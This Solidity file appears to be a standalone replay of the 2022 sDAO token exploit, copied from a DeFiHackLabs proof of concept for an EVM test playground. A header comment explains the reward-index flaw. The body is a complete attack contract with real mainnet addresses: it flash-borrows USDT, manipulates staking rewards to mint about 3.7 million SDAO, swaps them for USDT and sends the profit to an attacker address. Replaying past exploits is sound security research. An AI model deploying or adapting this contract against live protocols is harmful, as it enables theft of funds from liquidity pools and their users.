// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-11-SDAO).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest`
// harness — the DODO flash-loan callback `DPPFlashLoanCall` lives on the test
// itself (the test IS `address(this)` / the attacker), so there is no standalone
// contract to deploy. This file is a faithful, self-contained copy of that
// inline attack (testExploit body + DPPFlashLoanCall callback + minimal inline
// interfaces — no imports so it compiles anywhere), compiled inside the registry
// forge project. Logic and constants are copied verbatim from test/SDAO_exp.sol.
//
// Root cause: sDAO's staking reward index divides the reward numerator by the
// contract's LIVE `LPInstance.balanceOf(address(this))` instead of a tracked
// internal stake total. `withdrawTeam()` is permissionless and sweeps the whole
// staked-LP balance to TEAM (zeroing the divisor), a 7%-on-transfer-to-pool hook
// lets anyone pump the `totalStakeReward` numerator, and the `updateReward`
// modifier snapshots the baseline too early. Stake → pump → zero divisor →
// re-seed dust LP → getReward() mints ~3.7M SDAO, dumped into the pool for USDT.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface IsDAO is IERC20 {
    function stakeLP(uint256 _lpAmount) external;
    function withdrawTeam(address _token) external;
    function getReward() external;
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
}

interface IUniswapV2Pair is IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
}

interface IDPP {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract SDAODrain {
    // attacker EOA (the historical ContractTest address; profit receiver).
    address constant ATTACKER = 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496;
    address constant DODO = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618; // DPPOracle flash-loan source
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant SDAO = 0x6666625Ab26131B490E7015333F97306F05Bf816; // vulnerable token
    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // PancakeSwap V2 router
    address constant PAIR = 0x333896437125fF680f146f18c8A164Be831C4C71; // sDAO/USDT pair

    IERC20 constant usdt = IERC20(USDT);
    IsDAO constant sdao = IsDAO(SDAO);
    IUniswapV2Pair constant pair = IUniswapV2Pair(PAIR);
    IUniswapV2Router02 constant router = IUniswapV2Router02(ROUTER);

    // step 1: set up approvals, then flash-borrow 500 USDT from DODO. The callback
    // below performs the manipulation, drains, and repays the flash loan.
    function run() external {
        usdt.approve(ROUTER, type(uint256).max);
        sdao.approve(ROUTER, type(uint256).max);
        pair.approve(ROUTER, type(uint256).max);
        pair.approve(SDAO, type(uint256).max);
        // sDAO.approve(address(this), max) — needed for the self transferFrom below.
        sdao.approve(address(this), type(uint256).max);

        IDPP(DODO).flashLoan(0, 500 * 1e18, address(this), new bytes(1));

        // forward remaining USDT (the profit) to the attacker EOA.
        uint256 bal = usdt.balanceOf(address(this));
        if (bal > 0) {
            usdt.transfer(ATTACKER, bal);
        }
    }

    // DODO flash-loan callback (DPPFlashLoanCall). The pool optimistically sent
    // out 500 USDT; here the attacker acquires SDAO + LP, snapshots the reward
    // baseline, pumps the numerator, shrinks the divisor, claims the inflated
    // reward, dumps it, and repays the flash loan.
    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
        _usdtToSDAO(); // swap 250 USDT -> SDAO
        _addUSDTsDAOLiquidity(); // add 250 USDT + half the SDAO as liquidity
        // stake half the LP — `updateReward` snapshots lastTotalStakeReward here.
        sdao.stakeLP(pair.balanceOf(address(this)) / 2);
        // send the full SDAO balance to the pair: the 7%-to-pool hook pumps
        // totalStakeReward by ~198.69 SDAO (fresh, UN-snapshotted delta).
        sdao.transferFrom(address(this), PAIR, sdao.balanceOf(address(this)));
        // permissionless withdrawTeam sweeps the contract's entire LP balance to
        // TEAM → LPInstance.balanceOf(sDAO) == 0 (divisor zeroed).
        sdao.withdrawTeam(PAIR);
        // re-seed a dust 0.013 LP so the divisor is microscopic (146,000x too small).
        pair.transfer(SDAO, 13 * 1e15);
        // claim — getReward() mints ~3,698,480 SDAO (241.98 * 198.69 / 0.013).
        sdao.getReward();
        _sdaoToUSDT(); // dump the minted SDAO into the pool for USDT
        // repay the 500 USDT flash loan (0 fee).
        usdt.transfer(DODO, 500 * 1e18);
    }

    function _usdtToSDAO() internal {
        address[] memory path = new address[](2);
        path[0] = USDT;
        path[1] = SDAO;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            250 * 1e18, 0, path, address(this), block.timestamp + 60
        );
    }

    function _addUSDTsDAOLiquidity() internal {
        router.addLiquidity(
            USDT,
            SDAO,
            usdt.balanceOf(address(this)),
            sdao.balanceOf(address(this)) / 2,
            0,
            0,
            address(this),
            block.timestamp + 60
        );
    }

    function _sdaoToUSDT() internal {
        address[] memory path = new address[](2);
        path[0] = SDAO;
        path[1] = USDT;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            sdao.balanceOf(address(this)), 0, path, address(this), block.timestamp + 60
        );
    }
}
